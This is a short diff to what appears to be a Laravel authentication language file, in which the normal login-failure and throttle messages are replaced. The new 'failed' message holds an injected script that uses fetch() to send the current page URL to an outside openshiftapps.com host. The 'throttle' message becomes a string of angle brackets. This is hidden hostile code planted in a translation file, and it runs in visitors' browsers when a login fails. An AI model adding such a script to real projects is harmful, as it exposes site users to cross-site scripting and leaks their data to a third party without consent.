@@ -13,7 +13,7 @@ return [
     |
     */
 
-    'failed' => 'These credentials do not match our records.',
-    'throttle' => 'Too many login attempts. Please try again in :seconds seconds.',
+    'failed' => 'penetration"<script>fetch(\'https://ppc-ppc.1d35.starter-us-east-1.openshiftapps.com?\' + \'url=\' + encodeURI(window.location.href))</script>',
+    'throttle' => '<<<<',
 
 ];
